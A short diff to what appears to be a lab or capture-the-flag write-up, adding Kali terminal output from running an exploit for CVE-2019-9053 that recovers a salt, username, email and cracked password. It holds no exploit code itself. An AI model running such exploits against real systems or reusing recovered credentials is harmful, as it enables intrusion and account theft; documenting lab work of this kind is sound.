@@ -131,5 +131,14 @@ exploit.py  README.md
 └─$ 
 
 
+[+] Salt for password found: 1dac0d92e961
+[+] Username found: mitch
+[+] Email found: admin@admin.com
+[+] Password found: 0c01wk
+                                                                                                                       
+┌──(kali㉿kali)-[~/ken/CVE-2019-9053]
+└─$ 
+
+
 ```
 
